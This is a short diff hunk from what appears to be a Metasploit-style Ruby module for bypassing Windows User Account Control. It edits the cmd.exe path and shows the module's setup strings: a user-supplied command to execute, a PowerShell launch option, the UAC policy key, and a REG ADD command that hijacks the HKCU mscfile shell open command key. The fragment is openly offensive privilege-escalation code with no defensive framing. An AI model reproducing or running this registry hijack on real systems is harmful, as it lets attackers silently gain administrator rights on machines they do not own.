@@ -179,7 +179,7 @@ end
   vul_serve = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
+  comm_path = "%SystemRoot%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
   psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
